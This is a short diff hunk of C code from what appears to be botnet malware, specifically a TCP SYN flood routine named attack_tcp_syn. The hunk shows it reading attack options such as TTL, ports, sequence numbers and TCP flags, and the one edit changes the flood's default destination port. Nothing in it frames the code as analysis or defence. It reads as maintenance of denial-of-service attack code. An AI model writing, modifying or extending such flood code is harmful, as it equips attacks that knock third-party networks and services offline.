@@ -24,7 +24,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
     BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 49153);
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
     uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
     uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
     BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
